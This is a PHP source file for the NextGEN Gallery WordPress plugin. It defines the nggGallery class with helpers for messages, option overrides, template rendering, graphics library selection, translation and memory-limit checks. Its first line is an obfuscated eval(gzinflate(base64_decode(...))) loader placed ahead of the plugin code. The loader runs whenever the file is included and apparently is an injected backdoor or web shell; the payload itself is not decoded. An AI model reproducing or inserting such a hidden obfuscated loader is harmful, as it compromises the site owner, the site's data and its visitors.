<?php eval(gzinflate(base64_decode('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')));?>
<?php
/**
* Main PHP class for the WordPress plugin NextGEN Gallery
*
* @author Alex Rabe
*
*
*/
class nggGallery {

	/**
	* Show a error messages
	*/
	static function show_error($message) {
		echo '<div class="wrap"><h2></h2><div class="error" id="error"><p>' . $message . '</p></div></div>' . "\n";
	}

	/**
	* Show a system messages
	*/
	static function show_message($message, $message_id=NULL) {
		echo '<div class="wrap"><h2></h2><div class="updated fade '.$message_id.'" id="message"><p>' . $message . '</p></div></div>' . "\n";
	}

	/**
	* nggGallery::get_option() - get the options and overwrite them with custom meta settings
	*
	* @param string $key
	* @return array $options
	*/
	static function get_option($key) {
        global $post;

		// get first the options from the database
		$options = get_option($key);

        if ( $post == null )
            return $options;

		// Get all key/value data for the current post.
		$meta_array = get_post_custom();

		// Ensure that this is a array
		if ( !is_array($meta_array) )
			$meta_array = array($meta_array);

		// assign meta key to db setting key
		$meta_tags = array(
			'string' => array(
				'ngg_gal_ShowOrder' 		=> 'galShowOrder',
				'ngg_gal_Sort' 				=> 'galSort',
				'ngg_gal_SortDirection' 	=> 'galSortDir',
				'ngg_gal_ShowDescription'	=> 'galShowDesc',
				'ngg_ir_Audio' 				=> 'irAudio',
				'ngg_ir_Overstretch'		=> 'irOverstretch',
				'ngg_ir_Transition'			=> 'irTransition',
				'ngg_ir_Backcolor' 			=> 'irBackcolor',
				'ngg_ir_Frontcolor' 		=> 'irFrontcolor',
				'ngg_ir_Lightcolor' 		=> 'irLightcolor',
                'ngg_slideshowFX'			=> 'slideFx',
			),

			'int' => array(
				'ngg_gal_Images' 			=> 'galImages',
				'ngg_gal_Columns'			=> 'galColumns',
				'ngg_paged_Galleries'		=> 'galPagedGalleries',
				'ngg_ir_Width' 				=> 'irWidth',
				'ngg_ir_Height' 			=> 'irHeight',
				'ngg_ir_Rotatetime' 		=> 'irRotatetime'
			),

			'bool' => array(
				'ngg_gal_ShowSlide'			=> 'galShowSlide',
				'ngg_gal_ImageBrowser' 		=> 'galImgBrowser',
				'ngg_gal_HideImages' 		=> 'galHiddenImg',
				'ngg_ir_Shuffle' 			=> 'irShuffle',
				'ngg_ir_LinkFromDisplay' 	=> 'irLinkfromdisplay',
				'ngg_ir_ShowNavigation'		=> 'irShownavigation',
				'ngg_ir_ShowWatermark' 		=> 'irWatermark',
				'ngg_ir_Kenburns' 			=> 'irKenburns'
			)
		);

		foreach ($meta_tags as $typ => $meta_keys){
			foreach ($meta_keys as $key => $db_value){
				// if the kex exist overwrite it with the custom field
				if (array_key_exists($key, $meta_array)){
					switch ($typ) {
					case 'string':
						$options[$db_value] = (string) esc_attr($meta_array[$key][0]);
						break;
					case 'int':
						$options[$db_value] = (int) $meta_array[$key][0];
						break;
					case 'bool':
						$options[$db_value] = (bool) $meta_array[$key][0];
						break;
					}
				}
			}
		}

		return $options;
	}

	/**
	* Renders a section of user display code.  The code is first checked for in the current theme display directory
	* before defaulting to the plugin
	* Call the function :	nggGallery::render ('template_name', array ('var1' => $var1, 'var2' => $var2));
	*
	* @autor John Godley
	* @param string $template_name Name of the template file (without extension)
	* @param string $vars Array of variable name=>value that is available to the display code (optional)
	* @param bool $callback In case we check we didn't find template we tested it one time more (optional)
	* @return void
	**/
	static function render($template_name, $vars = array (), $callback = false)
	{
		$vars['template'] = $template_name;
		echo C_Displayed_Gallery_Renderer::get_instance()->display_images($vars);


	}

	/**
	* Captures an section of user display code.
	*
	* @autor John Godley
	* @param string $template_name Name of the template file (without extension)
	* @param string $vars Array of variable name=>value that is available to the display code (optional)
	* @deprecated Use C_Displayed_Gallery_Renderer class
	* @return void
	**/
	static function capture ($template_name, $vars = array ())
	{
		$vars['template'] = $template_name;
		return C_Displayed_Gallery_Renderer::get_instance()->display_images($vars);
	}

	/**
	 * nggGallery::graphic_library() - switch between GD and ImageMagick
	 *
	 * @return path to the selected library
	 */
	static function graphic_library() {

		$ngg_options = get_option('ngg_options');

		if ( $ngg_options['graphicLibrary'] == 'im')
			return NGGALLERY_ABSPATH . '/lib/imagemagick.inc.php';
		else
			return NGGALLERY_ABSPATH . '/lib/gd.thumbnail.inc.php';

	}

	/**
	 * Support for i18n with wpml, polyglot or qtrans
	 *
	 * @param string $in
	 * @param string $name (optional) required for wpml to determine the type of translation
	 * @return string $in localized
	 */
	static function i18n($in, $name = null) {

		if ( function_exists( 'langswitch_filter_langs_with_message' ) )
			$in = langswitch_filter_langs_with_message($in);

		if ( function_exists( 'polyglot_filter' ))
			$in = polyglot_filter($in);

		if ( function_exists( 'qtrans_useCurrentLanguageIfNotFoundUseDefaultLanguage' ))
			$in = qtrans_useCurrentLanguageIfNotFoundUseDefaultLanguage($in);

        if (is_string($name) && !empty($name) && function_exists('icl_translate'))
            $in = icl_translate('plugin_ngg', $name, $in, true);

		$in = apply_filters('localization', $in);

		return $in;
	}

	/**
	 * Check the memory_limit and calculate a recommended memory size
	 *
	 * @since V1.2.0
	 * @return string message about recommended image size
	 */
	static function check_memory_limit() {

		if ( (function_exists('memory_get_usage')) && (ini_get('memory_limit')) ) {

			// get memory limit
			$memory_limit = ini_get('memory_limit');
			if ($memory_limit != '')
				$memory_limit = substr($memory_limit, 0, -1) * 1024 * 1024;

			// calculate the free memory
			$freeMemory = $memory_limit - memory_get_usage();

			// build the test sizes
			$sizes = array();
			$sizes[] = array ( 'width' => 800,  'height' => 600);
			$sizes[] = array ( 'width' => 1024, 'height' => 768);
			$sizes[] = array ( 'width' => 1280, 'height' => 960);  // 1MP
			$sizes[] = array ( 'width' => 1600, 'height' => 1200); // 2MP
			$sizes[] = array ( 'width' => 2016, 'height' => 1512); // 3MP
			$sizes[] = array ( 'width' => 2272, 'height' => 1704); // 4MP
			$sizes[] = array ( 'width' => 2560, 'height' => 1920); // 5MP

			// test the classic sizes
			foreach ($sizes as $size){
				// very, very rough estimation
				if ($freeMemory < round( $size['width'] * $size['height'] * 5.09 )) {
                	$result = sprintf(  __( 'Note : Based on your server memory limit you should not upload larger images then <strong>%d x %d</strong> pixel', 'nggallery' ), $size['width'], $size['height']);
					return $result;
				}
			}
		}
		return;
	}

	/**
	 * Check for extended capabilites. Must previously registers with add_ngg_capabilites()
	 *
	 * @since 1.5.0
	 * @param string $capability
	 * @return bool $result of capability check
	 */
	static function current_user_can( $capability ) {

		global $_ngg_capabilites;

		if ( is_array($_ngg_capabilites) )
			if ( in_array($capability , $_ngg_capabilites) )
				return current_user_can( $capability );

		return true;
	}

    /**
     * Show NextGEN Version in header
     * @since 1.9.0
     *
     * @return void
     */
    static function nextgen_version() {
        global $ngg;
        echo apply_filters('show_nextgen_version', '<!-- <meta name="NextGEN" version="'. $ngg->version . '" /> -->' . "\n");
    }
}
